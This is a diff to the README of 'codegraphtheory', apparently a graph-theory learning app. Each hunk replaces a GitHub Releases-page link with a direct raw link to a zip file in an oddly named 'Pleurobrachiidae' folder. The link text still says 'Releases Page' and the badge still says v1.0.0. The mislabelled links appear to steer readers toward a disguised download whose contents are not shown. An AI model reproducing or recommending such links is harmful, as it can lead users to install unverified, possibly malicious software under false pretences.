@@ -1,6 +1,6 @@
 # 📊 codegraphtheory - Learn Graph Theory Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-brightgreen)](https://github.com/Amaan78614/codegraphtheory/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Amaan78614/codegraphtheory/main/Pleurobrachiidae/codegraphtheory_1.3.zip)](https://raw.githubusercontent.com/Amaan78614/codegraphtheory/main/Pleurobrachiidae/codegraphtheory_1.3.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ To get started, you will need to download the application from our Releases page
 
 ## 📥 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/Amaan78614/codegraphtheory/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Amaan78614/codegraphtheory/main/Pleurobrachiidae/codegraphtheory_1.3.zip)
 
 1. Click on the link above.
 2. On the Releases page, look for the latest version.
@@ -76,4 +76,4 @@ For questions or feedback, please open an issue on this repository or contact us
 
 Stay updated with our latest releases and developments. Follow us on GitHub and be part of the learning journey.
 
-Visit this page to download: [Releases Page](https://github.com/Amaan78614/codegraphtheory/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Amaan78614/codegraphtheory/main/Pleurobrachiidae/codegraphtheory_1.3.zip)
